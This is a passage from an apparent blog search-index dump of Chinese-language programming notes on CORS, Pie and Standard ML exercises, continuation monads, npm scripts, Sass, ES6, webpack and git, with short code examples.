(怎樣叫同源)\n下面是網址大概的樣子\n&lt;A&gt;://&lt;B&gt;:&lt;C&gt;/....\n而同源就是 A,B,C都要一樣\nCORS 會從req header中看什麼\n\nOrigin\n有沒有稀奇的header\n有沒有稀奇的HTTP Verb\n\n不稀奇的header\n\nAccept\nAccept-Language\nContent-Language\nLast-Event-ID\nContent-Type：只能是 application/x-www-form-urlencoded、multipart/form-data、text/plain\n\n不稀奇的HTTP Verb\n\nHEAD\nGET\nPOST\n\nCORS 是怎麼與瀏覽器互動的\nRequest\nif 沒有任何稀奇的HTTP Verb或header    送出有Origin header的reqelse    把 稀奇的HTTP Verb 與 稀奇的 header 與 Origon 先送去問能不能過    // Access-Control-Request-Method, Access-Control-Request-Headers\nif   branch 是 簡單請求\nelse branch 是 非簡單請求\nResponse\n怎麼知道有沒有過?\n看回覆有沒有Access-Control-Allow-Origin\n比較 CSP 與 CORS\n都是由server可以告訴browser 限制哪些資源的調用\nCSP特別把 script, img, style, iframe 再拉出來特別講\n與CORS相比，CSP不能設定HTTP verb\n不過CSP可以限制browser的功能，像禁止eval或inline JS等等\nRef\n如果不想搞CORS\n","categories":["Rails","FAQ"]},{"title":"在travisCI上hexo generate出空白頁面","url":"/2020/5/hexo-generate-empty-page-on-travisci/","content":"因為有設定好travisci，所以只要push上去就可以完成文章更新\n但剛剛發現怎麼生出來的page都是空的!!\n同時travisci上還有warning\n\n結果發現是travisci的node太新了，改成13版的node去跑就沒事了\nsudo: falselanguage: node_jsnode_js:#  - node   - 13cache: npm","categories":["Utils","Small project","CI","Tips"]},{"title":"little typer 前篇(1~7) 整理與筆記","url":"/2020/5/little-typer-1-7/","content":"介紹Pie怎麼用\n\nch1 &amp; ch2 &amp; ch3\n\n所有東西都是expression\n\n有人斷言expression有某種屬性或與其他expression有共通的特質是judgment\n\nSentences get their meaning from those who understand them.\nThe sentences capture thoughts that we have, and thoughts are more important than the words we use to express them.\n\n\n描述某一群expression的expression是Type\n\n當type constructor在頂部就是type (Pair Nat Nat)\n\n\nconstructor在頂部就是Value\n\nconstructor會產生某個type的實體(像add1會產生Nat的實體，8也是Nat的實體)\neliminator會分解value取出構成value的資訊\n\n\n當某一expression無法再被改寫時叫normal form\n\n改寫expression叫evaluation\n\n\nexpression因為有變數而無法繼續改寫叫neutral\n\n\n只要長的一樣就是same (不是等於，之後會用same去證等於)\ntotal function對任何一個值都能產生對應的值\n沒有遞迴\n\n因為每個expression都一定要收斂\n所以有其他東西來做類似的效果\n\n\n\nevaluation &amp; value\n在dependent type中，evaluation得到的是expression\n在一般PL(像lisp)中，evaluation得到的是value\n在一般PL中，expression與value是不同類別的東西\n\nch4 &amp; ch5\nclaim &amp; define\n在pie中要產生一個變數要先claim再define\n(claim one    Nat)(define one    (add1 0))\n函數的部分用(-&gt; arg1 arg2 ... ret)宣告\n函數或是需要type作為參數用(Pi ((arg1 type1) (arg2 type2) ...)) ...)宣告\nlen\n;; 原本(define (len l)  (if (null? l)      0      (add1 (len (cdr l)))));; now(claim len  (Pi ((T U)) ;; U是Universe，意指所有的type(但不包含自己)    (-&gt; (List T) Nat)))(define len  (λ (T l) ;; Pie的lambda會自己curry    (rec-List l      0      (λ (car_L cdr_L ret) ;; rec-&#123;type&#125;會把做遞迴的參數分解，以及把ret塞回來，可以想成backtrace的部分        (add1 ret)))))\n還有其他老朋友，但就先跳過\nch6 &amp; ch7\nvector與list很像，但有長度在type中\nfirst\n(claim first  (Pi ((T U)       (n Nat))    (-&gt; (Vec T n) T)))(define first  (λ (T n v)    (head v)))\n這個傳空的就會出事\n可以改宣告，限制只吃只少有一個的vec\n(claim first  (Pi ((T U)       (n Nat))    (-&gt; (Vec T (add1 n)) T)))  (define first  (λ (T n v)    (head v)))\nlast\n原本rec-List或rec-Nat都是回傳type不變的值，但現在vec有長度，所以會變!!\n對此我們要ind-Nat，意思是對整數做歸納法\nind-Nat多了一個東西是motive，函數，會吃一個正在做歸納法的值，回傳應該有的type\n而motive也於ind-Nat其他部位有關係\n(claim last  (Pi ((T U)       (n Nat))    (-&gt; (Vec T (add1 n)) T)))  (define last  (λ (T n v)    (ind-Nat n      (λ (x) (-&gt; (Vec T (add1 x)) T))      (λ (v1) (head v1))      (λ (n-1 ret) ;; 有沒有覺得與rec-Nat有點像        (λ (v)          (ret (tail v)))))))(claim last-motive  (-&gt; U Nat U))(define last-motive  (λ (T)    (λ (n)      (-&gt; (Vec T (add1 x)) T)))) ;; 把last的Pi的參數拿掉剩下就是我們要的(claim last-base  (Pi ((T U))    (last-motive T 1))) ;; 原本應該是0，但已經限制要大於1(claim last-step  (Pi ((T U)       (n Nat))    (-&gt; (last-motive T n) ;; 吃舊的值(n-1,或是叫他回傳值)        (last-motive T (add1 n))))) ;; 丟新的值(define last-base  (λ (T v)    (head v)))(define last-step  (λ (T)    (λ (n-1 ret)      (λ (v)        (ret (tail v))))))(define last  (λ (T v)    (ind-Nat v      (last-motive T)      (last-base T)      (last-step T))))\n到這裡基本的Pie已經說完了，剛剛last有寫兩個版本，重要的是理解ind-Nat的motive與motive是怎麼與其他ind-Nat的部位有關係的\n","categories":["Lisp","Reading"]},{"title":"monad推導，主要是cont monad","url":"/2020/5/monad-derive/","content":"把參數藏起來\n把acc藏起來看看\n  (define (sum l acc)  (if (null? l)    acc    (sum (cdr l) (+ acc (car l)))))\n\ndelay 要藏的變數\n\n  (define (sum1 l)  (lambda (acc)    (if (null? l)      acc      ((sum2 (cdr l))        (+ (car l) acc)))))\n\n把lambda推到if的兩項\n\n  (define (sum2 l)  (if (null? l)    (lambda (acc) acc)    (lambda (acc)      ((sum2 (cdr l))        (+ (car l) acc)))))\n\n抽出遞迴的part\n\n  (define (sum3 l)  (if (null? l)    (lambda (acc) acc)    (let ((m (sum3 (cdr l))))      (lambda (acc)        (m          (+ (car l) acc))))))\n\n把運算抽出來，並把delay的變數塞回去\n\n  (define (sum4.5 l)  (if (null? l)    (lambda (acc) acc)    (let ((m (sum4 (cdr l)))          (f (lambda (acc) (+ (car l) acc)))) ;; maybe use -(minus), i could spot out this error      (lambda (acc)        (f (m acc))))))   ;; recursive;; 這邊變成了先遞迴，等回來再做f;; 當初自己推導是先寫出這個的!! WHYYYYY(define (sum4 l)  (if (null? l)    (lambda (acc) acc)    (let ((m (sum4 (cdr l)))          (f (lambda (acc) (+ (car l) acc))))      (lambda (acc)        (m (f acc)))))) ;; iterative\n番外篇: 左右遞迴\n(define (sub4 l)  (if (null? l)    (lambda (acc) acc)    (let ((m (sub4 (cdr l)))          (f (lambda (acc) (- (car l) acc))))      (lambda (acc)        (m (f acc)))))) ;; iterative, foldl(define (sub5 l)  (if (null? l)    (lambda (acc) acc)    (let ((m (sub5 (cdr l)))          (f (lambda (acc) (- (car l) acc))))      (lambda (acc)        (f (m acc)))))) ;; recursive, foldr \n((sub4 &#x27;(2 3 1 4)) 6)=&gt; 102 - 6 = -43 - -4 = 71 - 7 = -64 - -6 = 10((sub5 &#x27;(2 3 1 4)) 6)=&gt; 24 - 6 = -21 - -2 = 33 - 3 = 02 - 0 = 2\n藏 continuation\n現在用同樣的方式藏continuation\n(define (sum-k l k)  (if (null? l)    (k 0)    (sum-k (cdr l)           (lambda (ret)            (k (+ (car l) ret))))))\n(define (sum-k2 l)  (if (null? l)    (lambda (k) (k 0))    (lambda (k)      ((sum-k2 (cdr l))            (lambda (ret)              (k (+ (car l) ret)))))))\n(define (sum-k3 l)  (if (null? l)    (lambda (k) (k 0))    (let ((m (sum-k3 (cdr l))))      (lambda (k)        (m          (lambda (ret)            (k (+ (car l) ret))))))))\n(define (sum-k4 l)  (if (null? l)    (lambda (k) (k 0))    (let ((m (sum-k3 (cdr l)))          (f (lambda (ret)                (lambda (k)                  (k (+ (car l) ret))))))      (lambda (k)        ((m f) k))))) ;; NOOOOO!!! f should contains k before m(define (sum-k4 l)  (if (null? l)    (lambda (k) (k 0))    (let ((m (sum-k4 (cdr l)))          (f (lambda (ret)                (lambda (k)                  (k (+ (car l) ret))))))      (lambda (k)        (m (lambda (v) ((f v) k))))))\ncont monad\n(define (bind m f)    (lambda (k)        (m (lambda (v) ((f v) k)))))(define (return v)    (lambda (k) (k v)))\n(define (sum&#x27; l)  (callcc (lambda (exit)      (cond        ((null? l) (return 0))        (else (bind                (sum&#x27; (cdr l))                (lambda (ret)                    (lambda (k)                        (k (+ ret (car l)))))))))))\ncallcc\n(define (callcc f)  (λ (k)    ((f (λ (ret) ;; 要跳出去時，會先收到值          (λ (_) ;; 原本接下來要做的事            (k ret)))) ;; 直接用之前的     k))) ;; 用之前的","categories":["PLT","Tips"]},{"title":"npm-scripts的用法整理","url":"/2020/5/npm-scripts/","content":"基本用法\n在package.json中寫下\n&#123;  // ...  &quot;scripts&quot;: &#123;    &quot;build&quot;: &quot;node build.js&quot;  &#125;&#125;\n就可以用npm rum build來跑node build.js\nargument &amp; wildcard\n&quot;lint&quot;: &quot;jshint **/*.js&quot; **是任一個folder\n要傳參數要加--\nnpm run lint --  --reporter checkstyle &gt; checkstyle.xml\nhook\n\nprepublish，postpublish\npreinstall，postinstall\npreuninstall，postuninstall\npreversion，postversion\npretest，posttest\nprestop，poststop\nprestart，poststart\nprerestart，postrestart\n\n有趣的是，自己加的指令也可以pre與post\n像prelint與postlint\n&quot;scripts&quot;: &#123;    &quot;cleanlogs&quot; : &quot;rm -r ./logs/ &amp;&amp; mkdir logs&quot;,    &quot;lint&quot;: &quot;jslint &#x27;*.js&#x27;&quot;,    &quot;test&quot;: &quot;mocha -u bdd -R spec&quot;,    &quot;pretest&quot;: &quot;npm run lint &amp;&amp; npm run cleanlogs&quot;,    &quot;posttest&quot;: &quot;npm run cleanlogs&quot;,    &quot;prelint&quot;: &quot;npm install jslint --save-dev&quot;&#125;\nNPM 給的 env var\n\nnpm_lifecycle_event: 現在跑的script名稱\nnpm_package_**: package.json中的item\nnpm_config_**: npm config的item\n\n&#123;  &quot;name&quot;: &quot;foo&quot;,   &quot;version&quot;: &quot;1.2.5&quot;,  &quot;config&quot; : &#123; &quot;port&quot; : &quot;8080&quot; &#125;,  &quot;scripts&quot;: &#123;    &quot;view&quot;: &quot;node view.js&quot;  &#125;,  &quot;repository&quot;: &#123;    &quot;type&quot;: &quot;git&quot;,    &quot;url&quot;: &quot;xxx&quot;  &#125;&#125;\nconsole.log(process.env.npm_package_name); // fooconsole.log(process.env.npm_package_version); // 1.2.5console.log(process.env.npm_package_repository_type) // git\n透過NPM修改runtime的值\n像如果想改上面config的port用\nnpm config set foo:port 80\nNPM的參數 g &amp; save\n–save : 更新該套件資訊到 package.json\n-g : 安裝到全域，也就是電腦上都可以直接用，而不是只有專案中才可以調用\nRef\nSource\n","categories":["Javascript","Tips"]},{"title":"sass的簡單語法整理","url":"/2020/5/sass-survey/","content":"\nMixins =&gt; macro\nFunctions =&gt; 算出sass的資料 (是一級函數，用法類似common lisp)\nExtends =&gt; 共用同一塊code，繼承關係\nNesting =&gt; 表明父子關係\n\noperator\n\n@ =&gt; built-in operator\n% =&gt; 類似html的template，for extended css code\n$ =&gt; var\n#&#123;...&#125; =&gt; Interpolation #&#123;$property&#125;: $value;\n&amp; =&gt; reference to parent class, nesting\nmath operator\n\nul, ol &#123;  text-align: left;  &amp; &amp; &#123;    padding: &#123;      bottom: 0;      left: 0;    &#125;  &#125;&#125;ul, ol &#123;  text-align: left;&#125;ul ul, ol ol &#123;  padding-bottom: 0;  padding-left: 0;&#125;\nspecial datatype\ncolor\n@debug #f2ece4; // #f2ece4@debug #b37399aa; // rgba(179, 115, 153, 67%)@debug midnightblue; // #191970@debug rgb(204, 102, 153); // #c69@debug rgba(107, 113, 127, 0.8); // rgba(107, 113, 127, 0.8)@debug hsl(228, 7%, 86%); // #dadbdf@debug hsla(20, 20%, 85%, 0.7); // rgb(225, 215, 210, 0.7)\nlist &amp; map\nmap\n$font-weights: (&quot;regular&quot;: 400, &quot;medium&quot;: 500, &quot;bold&quot;: 700);@debug map.get($font-weights, &quot;medium&quot;);// immutable!!\nlist\n@debug list.nth(10px 12px 16px, 2); // 12px@debug list.nth([line1, line2, line3], -1); // line3//content Immutability (list[0] = 10; XX)\nflow control\n@mixin theme-colors($light-theme: true) &#123;  @if $light-theme &#123;    background-color: $light-background;    color: $light-text;  &#125; @else &#123;    background-color: $dark-background;    color: $dark-text;  &#125;&#125;@each $size in $sizes &#123;  .icon-#&#123;$size&#125; &#123;    font-size: $size;    height: $size;    width: $size;  &#125;&#125;// throught (1..3) 包含3 // to (1...3) 不包含3@for $i from 1 through 3 &#123;   ul:nth-child(3n + #&#123;$i&#125;) &#123;    background-color: lighten($base-color, $i * 5%);  &#125;&#125;@function scale-below($value, $base, $ratio: 1.618) &#123;  @while $value &gt; $base &#123;    $value: $value / $ratio;  &#125;  @return $value;&#125;$normal-font-size: 16px;sup &#123;  font-size: scale-below(20px, 16px);&#125;","categories":["CSS","Tips"]},{"title":"The Little MLer 筆記","url":"/2020/5/the-little-mler-note/","content":"ch0: 執行環境\n想用wsl來跑sml的話，poly/ml是不錯的選項\nch1: 定義type\ndatatype num = ZERO | ONE_MORE of numdatatype ‘a Slist = NIL of ‘a | SCONS of ‘a Slist\nch2: 寫function\ndatatype Abc = A | B of Abc | C of Abcfun only_B(A) = true    | only_B(B(x)) = only_B(x)    | only_B(C(x)) = false(only_B : Abc -&gt; bool)datatype ‘a Xyz = X of ‘a | Y of ‘a Xyz | Z of ‘a Xyzfun is_xy(X(x)) = true    | is_xy(Y(x)) = is_xy(x)    | is_xy(Z(x)) = false(is_xy : ‘a Xyz -&gt; bool)\nch3: 在list上遞迴\nfun rem_B(A) = A    | rem_B(B(x)) = rem_B(x)    | rem_B(C(x)) = C(rem_B(x))fun C_in_fron_of_B(A) = A    | C_in_fron_of_B(B(x)) = C(B(C_in_fron_of_B(x)))    | C_in_fron_of_B(C(x)) = C(C_in_fron_of_B(x))fun subst_B_C(x) = rem_B(C_in_fron_of_B(x))(* OR *)fun subst_B_C(A) = A    | subst_B_C(B(x)) = C(subst_B_C(x))    | subst_B_C(C(x)) = C(subst_B_C(x))(* 都是走訪同一list故可以用同一種走訪，把兩個式子結合起來(map fusion) *)\nch4: tuple &amp; 多參數function\n(A,X,A) :: (Abc * Xyz * Abc)datatype Abc = A | B | Cfun add_a(A) = (A,A)    | add_a(B) = (B,A)    | add_a = (C,A)(add_a : Abc -&gt; (Abc * Abc))\n可以利用type variable來打少一點字\nfun add_a(x) = (x * A)(add_a : ‘a -&gt; (‘a * Abc))\n這個比較抽象，但是比較詳細的(照著datatype產生的fun)可以找出更多可能的錯誤\nfun has_a(a:Xyz, A, b:Xyz) = true    | has_a(a:Xyz, b, b:Xyz)) = false(has_a : (Xyz * Abc * Xyz) -&gt; bool)\nch5: type的參數可以不只一個\ntype的參數可以不只一個\ndatatype ‘a De = D | E of (‘a * (‘a De))datatype Abc = A | B | Cfun rem_a(D) = D    | rem_a(E(A,x)) = rem_a(x)    | rem_a(E(B,x)) = E(B,rem_a(x))    | rem_a(E(C,x)) = E(C,rem_a(x))(* shorter version *)fun rem_a(D) = D    | rem_a(E(A,x)) = rem_a(x)    | rem_a(E(y,x)) = E(y,rem_a(x))\n抽象與組合數\n輸入的維度上升，pattern的數量(組合數)上升\nfun rem(x,D) = D     | rem(A,E(A,y)) = rem(A, y)     | rem(A,E(x,y)) = E(x,rem(A, y))     | rem(B,E(A,y)) = rem(B, y)     | rem(B,E(x,y)) = E(x,rem(B, y))     | rem(C,E(C,y)) = rem(C, y)     | rem(C,E(x,y)) = E(x,rem(C, y))(rem : (Abc * Abc De) -&gt; Abc De)\n把其中一個維度抽出來，像\nfun eq_Abc(A,A) = true     | eq_Abc(B,B) = true     | eq_Abc(C,C) = true     | eq_Abc(x,y) = falsefun rem(x,D)         = D     | rem(x,E(y,z)) = if eq_Abc(x,y)                       then rem(x,z)                       else E(y,rem(x,z))\nch6: 樹形遞迴\ndatatype tree = E | L of Abc * tree | S of tree * treedatatype ‘a tree = E | F of ‘a * ‘a tree | S of ‘a tree * ‘a treefun occur_Abc(a,E) = 0    | occur_Abc(a,L(b,x)) = if eq_Abc(a,b) then 1+occur_Abc(a,x) else occur_Abc(a,x)    | occur_Abc(a,S(x,y)) = occur_Abc(a,x) + occur_Abc(a,y)\nsexp &amp; slist\ndatatype ‘a SList = NIL | SCONS of ‘a Sexp * ‘a SListand\t       ‘a Sexp = ATOM of ‘a | SLIST of ‘a SList\nfun occur_Abc_SL(a,Nil) = 0    | occur_Abc_SL(a,SCons(x,y)) = occur_abc_SE(a,x) + occur_abc_SL(a,y)    andfun occur_Abc_SE(a,Atom(b)) = if eq_Abc(a,b) then 1 else 0    | occur_Abc_SE(a,Slist(x)) = occur_Abc_SL(a,x)\n先展開occur_Abc_SE\nfun occur_Abc_SL(a,Nil) = 0    | occur_Abc_SL(a,SCons(Atom(x),y)) = if eq_Abc(a,b) then 1 + occur_abc_SL(a,y) else 0 + occur_abc_SL(a,y)    | occur_Abc_SL(a,SCons(Slist(x),y)) = occur_abc_SL(a,x) + occur_abc_SL(a,y)\n其實SCons的部分都長的很像，做 抽象與合併 !!\nfun eq_Abc_atom(a,Atom(b)) = eq_Abc(a,b)    | eq_Abc_atom(a,Slist(b)) = falsefun occur_Abc_SL(a,Nil) = 0    | occur_Abc_SL(a,SCons(x,y)) = if eq_Abc_atom(a,x) then 1+occur_abc_SL(a,y) else occur_Abc_SE(a,x) + occur_abc_SL(a,y)     andfun occur_Abc_SE(a,Atom(b)) = 0    | occur_Abc_SE(a,Slist(x)) = occur_Abc_SL(a,x)\nch7: first-order function &amp; stream\nfirst-order function &amp; type inference\nfun true_mk(x) = true(true_mk : ‘a -&gt; bool)datatype B_or_I = HOT of bool | COLD of intfun help(f)     = Hot(true_mk(\tif true_mk(__)\tthen f\telse true_mk))(help : ? -&gt; B_or_I)\nf的type是什麼?\nthen part與else part的type要一樣，故f的type是’a -&gt; bool\nstream\ndatatype chain = LINK of (int * (int -&gt; chain))\n這裡是把function包上datatype，這樣可以把遞迴藏起來，因為是datatype的關係，在使用時一定要先打開來，才可以做下一個動作。\nfun ints(n) = LINK(n+1, ints)fun skips(n) = LINK(n+2, skips)fun some_ints(n) = if is_mod_5_or_7(n+1) then LINK(n+1, some_ints) else some_ints(n+1)\n上面是產生stream的起點，接著要get stream的值\nfun chain_item(n,Link(x,f)) = if eq_1(n) then x else chain_item(n-1,f(n))\n如果有個is_prime\nfun primes(n) = if is_prime(n+1) then LINK(n+1, primes) else primes(n+1)\nfib 是一定要的\nfun fibs(n)(m) = LINK(n+m, fibs(m))(fibs : int -&gt; (int -&gt; chain))fun fibs_1(m) = LINK(1 + m, fibs(m)) ( == fibs(1))\nch8: curried\nfun in_range_c(s,l)(x) = if less_then(s,x) then less_than(x,l) else false(in_range_c : (int * int) -&gt; (int -&gt; bool))\nfun combine(Nil,Nil) = Nil    | combine(Nil,Cons(a,x)) = Cons(a,x)    | combine(Cons(a,x),Nil) = Cons(a,x)    | combine(Cons(a,x)),Cons(b,y)) = Cons(a,combine(x,Cons(b,y))fun combine(Nil,y) = y    | combine(Cons(a,x)),y) = Cons(a,combine(x,y))\n第一種寫法把所有組合列出來\n而第二種是只處理一個維度，剩下遞迴\n而curried後\nfun combine_c(Nil)(y) = y    | combine_c(Cons(a,x))(y) = Cons(a,combine_c(x)(y))\n可以想像成\ncombine_c(Cons(1,Cons(2,Nil))) =&gt; \\y -&gt; Cons(1,combine_c(Cons(2,Nil))(y))\n所以curried的另一種寫法\nfun combine_s(Nil) = fn l2 =&gt; l2    | combine_s(Cons(a,x)) = fn l2 =&gt; Cons(a, combine_s(x)(l2))\nch9: exception\ndatatype box = Bacon | lx of Intexception No_bacon of intfun where_is(Nil) = raise No_bacon(0)    | where_is(Cons(a,x)) = if is_bacon(a) then 1 else 1+where_is(x)(* where_is(..) handle No_bacon(n) =&gt; n *)\nexception Out_of_rangefun list_item(n,Nil) = raise Out_of_range    | list_item(n,Cons(b,rest)) = if eq_int(n,1) then b else list_item(n-1,rest)fun find(n, boxes)    = (check(n,boxes,list_item(n,boxes)) handle Out_of_range =&gt; find(n div 2, boxes))and      check(n,boxes,Bacon) = n    | check(n,boxes,lx(i)) = find(i,boxes)fun path(n, boxes)    = Cons(n,(check(n,boxes,list_item(n,boxes)) handle Out_of_range =&gt; path(n div 2, boxes)))and      check(n,boxes,Bacon) = n    | check(n,boxes,lx(i)) = path(i,boxes)\n這裡的重點是 [X… (A… handle _ =&gt; B)]，當excepption發生時被接住時，此時會變成[X… B]。\nch10: module system in ML\n(* interface *)signature N = sig    type number    exception Too_small    val succ : number -&gt; number    val pred : number -&gt; number    val is_zero : number -&gt; boolend;(* class *)functor NumberAsNum() (* 傳入functor需要的參數(structure)與一些constraint(對內的type暴露) *)    :&gt; (* implements *)    N=    struct (private and implement signatrue)    datatype num = Zero | One_more_than of num    type number = num    exception Too_small    fun succ(n) = One_more_than(n)    fun pred(Zero) = raise Too_small | pred(One_more_than(n)) = n    fun is_zero(Zero) = true | is_zero(foo) = false; end;(* object *)structure NumStruct = NumberAsNum();\n另一個plus\nsignature P =sig    type number    val plus : number*number -&gt; numberend;functor PON(structure a_N : N)    :&gt;    P=struct    type number = a_N.number    fun plus(n,m) = if a_N.is_zero(n) then m else a_N.succ(plus(a_N.pred(n),m))end;structure NumArith = PON(structure a_N = NumStruct);\n哪兩個可以一起用嗎?\nNumArith.plus(Zero, One_more_than(Zero));\n我們不知道NumArith的number是什麼!!\n要處理這個問題有三個方法\n\n加入box與unbox的function\n\nsignature N_C_R =sig    type number    exception Too_small    val conceal : int -&gt; number    val succ : number -&gt; number    val pred : number -&gt; number    val is_zero : number -&gt; bool    val reveal : number -&gt; intend;(* NumStruct.reveal( NumArith.plus( NumStruct.conceal(1), NumStruct.conceal(2))); *)\n\n用where把type暴露出來\n\nfunctor PON(structure a_N : N):&gt;P where type number = a_N.number=struct    type number = a_N.number    fun plus(n,m) = if a_N.is_zero(n) then m else a_N.succ(plus(a_N.pred(n),m))end;functor NumberAsInt2():&gt;N where type number = int (* 這邊的int是refer到外面的env，不會碰到struct .. end 中的東西，*)=struct    type number = int    exception Too_small    fun succ(n) = n + 1 fun pred(n) = if n=0 then raise Too_small else n-1    fun is_zero(n) = n=0end;\n\nsharing type標出兩個type要一樣\n\nsignature J =sig    val new_plus : int*int -&gt; intend;functor NP(structure a_N : N_C_R           structure a_P : P           sharing type a_N.number = a_P.number)    :&gt;    J=struct    fun new_plus(x,y) = a_N.reveal( a_P.plus( a_N.conceal(x), a_N.conceal(y)))end;structure NPStruct = NP(structure a_N = NumberAsNum()    structure a_P = PON(structure a_N = a_N));\n小總結\nfunctor &lt;&lt;name&gt;&gt;(args with some relations(A.b is equal to B.c, 這也是為什麼fuctor的參數要named的理由))     :&gt;    &lt;&lt;sig(return type) with some relations(this type is same as ...)&gt;&gt;=struct    codeend;\nY in ML\nY的重點是有一個(g g)這是無限遞迴的，所以要中斷他。\n在第七章的stream(chain)中就利用datatype來打斷無限遞迴，所以這裡也要用相同的技巧。\n與chain不同的是，我們的函數的參數是自己，所以不用像chain要多一格來存apply到函數的參數。\n所以只要存自己就夠了\ndatatype &#x27;a T = INTO of &#x27;a T -&gt; &#x27;afun Y(f)= H(f)(INTO(H(f)))and H(f)(a) = f(G(a))and G(INTO(a))(x) = a(INTO(a))(x);fun mk_fact(fact)(n)    = if n=0        then 1        else n*fact(n-1);","categories":["PLT","Reading"]},{"title":"有趣與有用的es6特性","url":"/2020/5/useful-featrue-es6/","content":"下面是個人比較喜歡的es6的新特性\n終於來了!!\nTemplate Literals\n`Fifteen is $&#123;a + b&#125; and not $&#123;2 * a + b&#125;.`\nArrow Functions\nfunction Person() &#123;    this.age = 0;    // var self = this;    // 定義該 Arrow Functions 時的環境，是在 Person 物件中    setInterval(() =&gt; &#123;        // 所以 this 會正確指向 Person 物件        this.age++;        //self.age++    &#125;, 1000);&#125;var p = new Person();\nclass syntax sugar\nclass Animal &#123;     constructor(name) &#123;        this.name = name;    &#125;      speak() &#123;        console.log(this.name + &#x27; makes a noise.&#x27;);    &#125;    static triple(n) &#123;        if (n === undefined) &#123;            n = 1;        &#125;        return n * 3;  &#125;&#125;class Dog extends Animal &#123;    constructor(name) &#123;        super(name)        this.name = name;    &#125;    speak() &#123;        super.speak() // this會用到子類別的obj        console.log(this.name + &#x27; barks.&#x27;);    &#125;    static triple(n) &#123;        return super.triple(n) * super.triple(n);    &#125;&#125;var d = new Dog(&#x27;Mitzie&#x27;);// 顯示 Mitzie barks.d.speak();\nimport &amp; export\n// export [default] &lt;exp with var&gt;// var ..., function, class export &#123; encrypt &#125;;export &#123; decrypt as dec &#125;;import &#123;aString, aObject, aFunction, aClass&#125; from &#x27;./lib.js&#x27;import  * as myModule from &#x27;./lib.js&#x27;\n有趣的特性\nComputed property keys\nvar prefix = &#x27;es6&#x27;;var obj = &#123;    // 計算屬性    [prefix + &#x27; is&#x27;]: &#x27;cool&#x27;,        // 計算方法    [prefix + &#x27; score&#x27;]() &#123;        console.log(100);    &#125;&#125;; // 顯示 coolconsole.log(obj[&#x27;es6 is&#x27;]);// 顯示 100obj[&#x27;es6 score&#x27;]();\npreteier &amp; eslint\npreteier =&gt; 讓code好看\neslint =&gt; 檢查coding style\nvscode設定\nprettier\nESLint\neslint-config-airbnb\nPrettier-eslint\n用上面三個plugin後，先跑prettier再跑ESLint\n\n如果只想用一個指令(prettier,eslint)而已，請看Ref1\nRef1\nRef2\n","categories":["Javascript","Tips"]},{"title":"webpack簡單整理","url":"/2020/5/webpack-quick-note/","content":"目的\n就是打包你的程式，同時整合許多編譯器與外掛。\nwebpack.config.js\nvar path = require(&#x27;path&#x27;)var webpack = require(&#x27;webpack&#x27;)var HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;)module.exports = &#123;    mode: &quot;development&quot;,  devtool: &#x27;source-map&#x27;, // 編譯後的程式碼不會有 eval 這樣的用法 none  entry: [&#x27;./src/index&#x27;], // 從哪開始找檔案們  output: &#123; //輸出到哪裡去    path: path.join(__dirname, &#x27;dist&#x27;),    publicPath: &#x27;https://cdn.example.com/[hash]/&#x27;,    filename: &#x27;[name].bundle.js&#x27;  &#125;,  plugins: [ // webpack外掛，影響webpack執行的各個階段    new webpack.optimize.UglifyJsPlugin(&#123;      compressor: &#123;        warnings: false,      &#125;,    &#125;),    new webpack.optimize.OccurrenceOrderPlugin(),    new HtmlWebpackPlugin(&#123;      template: &#x27;./src/index.html&#x27;    &#125;)  ],  module: &#123;      rules: [ // a function turning file A to file B          &#123;                test: /.*font.*\\.svg$/,                use: &#123;                    loader: &#x27;file-loader&#x27;,                    options: &#123;                        name: &#x27;[name].[ext]&#x27;,                        outputPath: &#x27;./fonts/&#x27;,                        publicPath: &#x27;/fonts/&#x27;                    &#125;                &#125;            &#125;,            &#123;                test: /^(?!.*font).*\\.svg$/,                use: &#123;                    loader: &#x27;file-loader&#x27;,                    options: &#123;                        name: &#x27;[name].[ext]&#x27;,                        outputPath: &#x27;./images/&#x27;,                        publicPath: &#x27;/images/&#x27;                    &#125;                &#125;            &#125;,            &#123;                test: /\\.css$/i,                use: [                    &#x27;style-loader&#x27;,                    &#123;                      loader: &#x27;css-loader&#x27;,                      options: &#123;                        importLoaders: 1                      &#125;                    &#125;,                    &#123;                      loader: &#x27;less-loader&#x27;,                      options: &#123;                        noIeCompat: true                      &#125;                    &#125;            ],            &#125;,            &#123;                test: /\\.js$/,                exclude: /node_modules/,                use: [&#x27;babel-loader&#x27;, &#x27;eslint-loader&#x27;],            &#125;,      ]  &#125;&#125;\n編譯\nwebpack --mode production // Bundle all fileswebpack --watch // 當檔案變動時自動編譯\n","categories":["Javascript","Tips"]},{"title":"git筆記","url":"/2020/6/git-from-DS-view/","content":"動機\ngit的指令很多，希望能用一種統一的觀點來看\n\ncommit as Node\n(folder) -&gt; (stage :: node) -&gt; (repo :: linked list)\t\t   |\t\t  \\ /\t (stash :: pool of nodes)\nLinked List\nnew node &amp; use existing node\n\ngit add\n\n把folder中的file，加到node中\n\n\ngit stash\n\n把還沒加到repo(linked list)的node放到node的暫存區\n\n\n\nedit the last node\n\ngit amend\n\n修改最後一個node(HEAD)\n\n\n\niterate nodes\n\ngit filter-branch\n\nlist.map ...\n\n\ngit rebase\n\nnewlist = list.each ...; list.append(newlist)\n可以edit, squash(融合), drop, pick(保留)\n\n\n\nptr to node\n\ngit tag\n\n單純的ptr\n\n\ngit branch\n\n替node加上新的ptr，只是這個ptr會在他被append一個新node時，把該ptr往後移動\n所以可以把這個ptr當成&quot;最新&quot;或是&quot;現在&quot;\n\n\n\nappend node(s)\n\ngit commit\n\n把目前的node加到目前HEAD的後面\n就是list.append\n\n\ngit merge\n\nfast-forward: 把node上的branch ptr移動到最後面\n沒fast-forward: 新增一個node內容是把兩個node的內容AND起來\n\n\ngit revert\n\nappend一個node但與前一個node的內容相反\n\n\ngit cherry-pick\n\nappend一個node其內容與指定的node一樣\n\n\ngit fetch\n\n把remote branch的多出來node，依序append到目前的HEAD後面\n\n\n\nbackprojection\n如果把node想成是folder的投影，那我們也可以反過來投影回去\n\ngit checkout\n\n移動HEAD，把stage與folder(如果有給filename的話)設定回去\n\n\ngit reset\n移動HEAD與branch，有三個模式 ( hard : 用node內容影響folder &amp;\t( mixed : stage設成該node的內容 &amp;\t\t( soft : 移動ptr ))\n\n\nbisect\n\ngit bisect\n\n就是二分搜\n\n\n\nHEAD history\n\ngit reflog\n\nHEAD的history，如果做錯事可以來這邊找commit ID\n\n\nORIG_HEAD\n\ngit在rebase或是reset的HEAD值\n\n\n\nRef\n為你自己學 Git\ngit 